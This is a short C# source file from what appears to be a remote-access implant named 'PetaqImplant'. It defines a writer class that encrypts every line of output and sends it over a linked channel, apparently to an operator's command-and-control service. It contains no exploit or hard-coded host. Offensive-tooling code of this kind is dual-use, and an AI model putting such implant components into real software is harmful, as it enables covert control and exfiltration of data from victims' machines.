using System;
using System.Text;
using System.IO;

namespace PetaqImplant
{
    public class SocketWriter : TextWriter
    {
        public override Encoding Encoding
        {
            get { return Encoding.Default; }
        }
        public override void Write(string value)
        {
            // encrypt the data before sending
            value = Common.Encrypt(value);

            // send to the linked service
            Program.LinkService.Send(value);

        }
        public override void WriteLine(string value)
        {
            // encrypt the data before sending
            value = Common.Encrypt(value);

            // send to the linked service
            Program.LinkService.Send(value);
        }
    }
}
